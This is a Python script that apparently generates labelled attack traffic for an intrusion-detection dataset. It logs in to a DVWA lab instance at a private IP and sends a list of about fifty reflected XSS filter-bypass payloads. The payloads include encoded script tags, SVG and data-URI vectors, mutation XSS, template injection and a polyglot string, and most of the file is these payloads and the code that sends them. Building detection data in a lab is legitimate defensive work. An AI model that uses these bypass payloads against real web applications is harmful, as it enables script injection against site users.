import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS XSS ENTRENAMIENTO HIGH
# En nivel high DVWA aplica un filtro muy agresivo
# basado en lista negra de patrones. Solo funcionan
# tecnicas muy especificas de bypass.
# DISTINTOS a low y medium.
# =============================================

PAYLOADS_XSS_HIGH = [
    # Bypass con codificacion de entidades HTML
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;img src=x onerror=alert(1)&#x3E;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # SVG con namespace
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",
    "<svg xmlns:xlink='http://www.w3.org/1999/xlink' onload='alert(1)'>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><script xlink:href='data:,alert(1)'/></svg>",
    # Double encoding
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    # Unicode bypass
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    "\u003cimg src=x onerror=alert(1)\u003e",
    # Null bytes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<img src=x o\x00nerror=alert(1)>",
    # Template literals
    "<script>alert`1`</script>",
    "<script>alert`2`</script>",
    "<script>alert`XSS`</script>",
    # Prototype pollution
    "<script>Object.prototype.x=alert(1)</script>",
    "<script>Array.prototype.x=alert(1)</script>",
    # Data URI
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>",
    "<embed src='data:text/html,<script>alert(1)</script>'>",
    # CSS injection
    "<style>*{background:url(javascript:alert(1))}</style>",
    "<style>body{background-image:url(javascript:alert(1))}</style>",
    "<div style='background:url(javascript:alert(1))'>x</div>",
    # Expression (IE)
    "<div style='width:expression(alert(1))'>x</div>",
    # Mutation XSS
    "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    # Srcdoc
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe srcdoc='<img src=x onerror=alert(1)>'>",
    # Base64
    "<object data='data:application/x-shockwave-flash;base64,abc'>",
    # Angular/Vue injection
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    "${alert(1)}",
    "#{alert(1)}",
    # DOM clobbering
    "<form id=x><output id=y>test</output></form>",
    "<img name=getElementById>",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
    # Bypass con comentarios
    "<script>/**/alert(1)/**/</script>",
    "<img/**/src=x/**/onerror=alert(1)>",
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    # PHP tags
    "<?php echo '<script>alert(1)</script>'; ?>",
    # Evento no comun
    "<body onpageshow=alert(1)>",
    "<body onpagehide=alert(1)>",
    "<body onfocus=alert(1)>",
    "<html onmousemove=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_xss_high(session):
    print("\n[*] Iniciando ataques XSS HIGH...")
    payloads = PAYLOADS_XSS_HIGH.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS_H | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS High completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: XSS REFLECTED — NIVEL HIGH")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'xss'")
    print("  AVISO: Asegurate de que DVWA esta en nivel HIGH")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_xss_high(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'xss'")
    print("="*60)
